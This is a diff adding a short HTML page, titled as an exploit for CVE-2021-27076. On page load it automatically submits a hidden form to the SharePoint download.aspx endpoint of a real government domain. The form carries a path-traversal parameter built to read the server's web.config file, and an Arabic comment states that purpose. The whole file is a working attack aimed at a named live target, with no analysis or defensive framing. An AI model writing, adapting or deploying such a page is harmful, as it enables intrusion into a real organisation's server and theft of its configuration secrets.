@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF + File Read Exploit (CVE-2021-27076)</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+  <h2>Exploiting CVE-2021-27076 via CSRF</h2>
+
+  <!-- نموذج GET إلى SharePoint لقراءة web.config -->
+  <form method="GET" action="https://mof.gov.iq/_layouts/15/download.aspx">
+    <input type="hidden" name="SourceUrl" value="/sites/test/../../../../../../web.config">
+  </form>
+
+</body>
+</html>
